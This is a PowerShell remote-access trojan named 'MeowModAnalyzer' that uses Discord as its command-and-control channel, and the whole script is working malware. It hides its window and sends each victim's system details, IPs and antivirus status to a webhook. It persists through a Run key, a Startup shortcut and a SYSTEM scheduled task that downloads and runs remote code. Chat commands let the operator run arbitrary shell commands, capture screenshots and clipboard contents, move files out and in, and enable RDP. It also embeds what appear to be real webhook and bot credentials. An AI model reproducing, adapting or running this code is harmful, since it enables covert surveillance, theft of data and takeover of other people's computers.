$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$botToken = "MTUxMjkxNzg2NTY0MzM3NjY2MA.GwQpKI.xsOr-EJt_6grJ9_HqOfUIsb0AgLUqP5QRhSoIk"
$channelId = "1512918078189731890"

try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    '
    [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
} catch {}

function Send-Webhook {
    param($Content, $FilePath, $EmbedJson)
    
    $body = @{content = $Content; username = "MeowModAnalyzer"}
    if ($EmbedJson) { $body["embeds"] = @($EmbedJson | ConvertFrom-Json) }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        try {
            Add-Type -AssemblyName System.Net.Http
            $client = New-Object System.Net.Http.HttpClient
            $form = New-Object System.Net.Http.MultipartFormDataContent
            $jsonString = $body | ConvertTo-Json -Depth 10 -Compress
            $jsonContent = New-Object System.Net.Http.StringContent $jsonString
            $form.Add($jsonContent, "payload_json")
            $fileStream = New-Object System.IO.FileStream ($FilePath, [System.IO.FileMode]::Open)
            $fileContent = New-Object System.Net.Http.StreamContent $fileStream
            $form.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePath))
            $client.PostAsync("$webhookUrl?wait=true", $form).Result | Out-Null
            $client.Dispose()
            $fileStream.Close()
            return
        } catch {}
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Send-NewConnectionInfo {
    $pcName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    
    try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
    try { $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $publicIp = "Unknown" }
    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
    try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
    
    try {
        $av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue).displayName -join ", "
    } catch { $av = "None" }
    if (-not $av) { $av = "None detected" }
    
    try {
        $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress -join ", "
    } catch { $localIp = "Unknown" }
    
    $embed = @{
        title = "New Victim Connected - $pcName"
        color = 3066993
        fields = @(
            @{ name = "PC Name"; value = $pcName; inline = $true }
            @{ name = "User"; value = $userName; inline = $true }
            @{ name = "OS"; value = $osInfo; inline = $false }
            @{ name = "Public IP"; value = $publicIp; inline = $true }
            @{ name = "Local IP"; value = $localIp; inline = $true }
            @{ name = "CPU"; value = $cpu; inline = $false }
            @{ name = "RAM"; value = $ram; inline = $true }
            @{ name = "Antivirus"; value = $av; inline = $true }
        )
        footer = @{ text = "MeowModAnalyzer v2.2.1" }
        timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
    }
    
    $embedJson = $embed | ConvertTo-Json
    Send-Webhook -Content "1" -EmbedJson $embedJson
}

function Take-Screenshot {
    param($OutputPath)
    
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $graphics.Dispose()
        
        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        
        return $true
    } catch {
        return $false
    }
}

function Invoke-Command {
    param($CommandText)
    
    try {
        $result = Invoke-Expression -Command $CommandText 2>&1
        $output = $result | Out-String
        
        if ([string]::IsNullOrEmpty($output)) {
            $output = "[Command executed successfully - no output]"
        }
        
        if ($output.Length -gt 1900) {
            $tempFile = [System.IO.Path]::GetTempFileName() + ".txt"
            $output | Out-File -FilePath $tempFile -Encoding UTF8
            Send-Webhook -Content "Command output:" -FilePath $tempFile
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } else {
            Send-Webhook -Content $output
        }
    } catch {
        $errorMsg = $_.Exception.Message
        Send-Webhook -Content "Error: $errorMsg"
    }
}

function Enable-Persistence {
    try {
        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MeowModAnalyzer" -Value $regValue -ErrorAction SilentlyContinue
    } catch {}
    
    try {
        $startupFolder = [Environment]::GetFolderPath("Startup")
        $shortcutPath = Join-Path $startupFolder "MeowModAnalyzer.lnk"
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $shortcut.WindowStyle = 7
        $shortcut.Save()
    } catch {}
    
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
        Register-ScheduledTask -TaskName "MeowModAnalyzerTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Handle-Command {
    param($CommandName, $CommandArgs)
    
    $cmd = $CommandName.ToLower().Trim()
    $args = $CommandArgs
    
    switch ($cmd) {
        "!help" {
            $helpText = "**MeowModAnalyzer - Komendy:**`n"
            $helpText += "!screenshot - Zrzut ekranu`n"
            $helpText += "!cmd <komenda> - Wykonaj PowerShell`n"
            $helpText += "!shell <komenda> - Wykonaj CMD`n"
            $helpText += "!download <url> - Pobierz plik`n"
            $helpText += "!upload <sciezka> - Wyslij plik na Discord`n"
            $helpText += "!persist - Wlacz persistence`n"
            $helpText += "!rdp - Wlacz RDP`n"
            $helpText += "!info - Info o systemie`n"
            $helpText += "!ipconfig - Konfiguracja sieci`n"
            $helpText += "!pslist - Lista procesow`n"
            $helpText += "!prockill <pid> - Zabij proces`n"
            $helpText += "!lock - Blokada ekranu`n"
            $helpText += "!msg <tekst> - Pokaz okno dialogowe`n"
            $helpText += "!clipboard - Czytaj schowek`n"
            $helpText += "!exit - Zamknij agenta"
            Send-Webhook -Content $helpText
        }
        
        "!screenshot" {
            $ssPath = "$env:TEMP\ss_$(Get-Random).png"
            if (Take-Screenshot -OutputPath $ssPath) {
                Send-Webhook -Content "Screenshot:" -FilePath $ssPath
                Remove-Item $ssPath -Force -ErrorAction SilentlyContinue
            } else {
                Send-Webhook -Content "Screenshot failed"
            }
        }
        
        "!cmd" {
            if ($args) { Invoke-Command -CommandText $args }
            else { Send-Webhook -Content "Usage: !cmd <komenda>" }
        }
        
        "!shell" {
            if ($args) { Invoke-Command -CommandText "cmd /c $args" }
            else { Send-Webhook -Content "Usage: !shell <komenda>" }
        }
        
        "!download" {
            if ($args) {
                $fileName = [System.IO.Path]::GetFileName($args)
                $destPath = "$env:TEMP\$fileName"
                try {
                    Invoke-WebRequest -Uri $args -OutFile $destPath -ErrorAction Stop
                    Send-Webhook -Content "Downloaded: $fileName to $destPath"
                } catch {
                    $errorMsg = $_.Exception.Message
                    Send-Webhook -Content "Download failed: $errorMsg"
                }
            } else { Send-Webhook -Content "Usage: !download <url>" }
        }
        
        "!upload" {
            if ($args -and (Test-Path $args)) { Send-Webhook -Content "File: $args" -FilePath $args }
            else { Send-Webhook -Content "Usage: !upload <sciezka>" }
        }
        
        "!persist" {
            Enable-Persistence
            Send-Webhook -Content "Persistence enabled"
        }
        
        "!rdp" {
            try {
                Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 0 -ErrorAction SilentlyContinue
                Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
                Send-Webhook -Content "RDP enabled on port 3389"
            } catch {
                $errorMsg = $_.Exception.Message
                Send-Webhook -Content "RDP failed: $errorMsg"
            }
        }
        
        "!info" {
            try { $pcName = $env:COMPUTERNAME } catch { $pcName = "Unknown" }
            try { $userName = $env:USERNAME } catch { $userName = "Unknown" }
            try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
            try { $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $publicIp = "Unknown" }
            try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
            try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
            
            $embed = @{
                title = "System Info - $pcName"
                color = 3447003
                fields = @(
                    @{ name = "PC Name"; value = $pcName; inline = $true }
                    @{ name = "User"; value = $userName; inline = $true }
                    @{ name = "OS"; value = $osInfo; inline = $false }
                    @{ name = "Public IP"; value = $publicIp; inline = $true }
                    @{ name = "CPU"; value = $cpu; inline = $false }
                    @{ name = "RAM"; value = $ram; inline = $true }
                )
                timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
            }
            
            $embedJson = $embed | ConvertTo-Json
            Send-Webhook -Content "System Info:" -EmbedJson $embedJson
        }
        
        "!exit" {
            Send-Webhook -Content "Agent shutting down..."
            exit
        }
        
        "!ipconfig" { Invoke-Command -CommandText "ipconfig /all" }
        
        "!pslist" { Invoke-Command -CommandText "tasklist /V" }
        
        "!prockill" {
            if ($args -and $args -match '^\d+$') {
                try {
                    taskkill /PID $args /F 2>&1 | Out-Null
                    Send-Webhook -Content "Killed process PID: $args"
                } catch {
                    $errorMsg = $_.Exception.Message
                    Send-Webhook -Content "Failed to kill: $errorMsg"
                }
            } else { Send-Webhook -Content "Usage: !prockill <pid>" }
        }
        
        "!lock" {
            rundll32.exe user32.dll,LockWorkStation
            Send-Webhook -Content "Workstation locked"
        }
        
        "!msg" {
            if ($args) {
                try {
                    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                    [System.Windows.Forms.MessageBox]::Show($args, "MeowModAnalyzer", "OK", "Information") | Out-Null
                    Send-Webhook -Content "Message shown"
                } catch {
                    $errorMsg = $_.Exception.Message
                    Send-Webhook -Content "Message failed: $errorMsg"
                }
            } else { Send-Webhook -Content "Usage: !msg <tekst>" }
        }
        
        "!clipboard" {
            try {
                Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
                if ($clipboardText) { Send-Webhook -Content "Clipboard: $clipboardText" }
                else { Send-Webhook -Content "Clipboard is empty" }
            } catch {
                $errorMsg = $_.Exception.Message
                Send-Webhook -Content "Clipboard failed: $errorMsg"
            }
        }
        
        default {
            Send-Webhook -Content "Unknown command: $cmd. Use !help"
        }
    }
}

# Glowna petla
Send-NewConnectionInfo
Enable-Persistence
Send-Webhook -Content "Agent ready! Listening for commands..."

$lastMessageId = $null

while ($true) {
    try {
        $url = "https://discord.com/api/v9/channels/$channelId/messages?limit=5"
        $headers = @{
            "Authorization" = "Bot $botToken"
            "User-Agent" = "MeowModAnalyzer/2.2.1"
        }
        
        $messages = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction SilentlyContinue
        
        if ($messages -and $messages.Count -gt 0) {
            foreach ($msg in $messages) {
                $isNew = ($lastMessageId -eq $null) -or ($msg.id -gt $lastMessageId)
                $isNotBot = -not $msg.author.bot
                $isCommand = $msg.content -match '^!'
                
                if ($isNew -and $isNotBot -and $isCommand) {
                    $parts = $msg.content -split ' ', 2
                    $commandName = $parts[0]
                    $commandArgs = ""
                    if ($parts.Count -gt 1) {
                        $commandArgs = $parts[1]
                    }
                    
                    Handle-Command -CommandName $commandName -CommandArgs $commandArgs
                }
                
                if ($lastMessageId -eq $null -or $msg.id -gt $lastMessageId) {
                    $lastMessageId = $msg.id
                }
            }
        }
    } catch {}
    
    Start-Sleep -Seconds 3
}
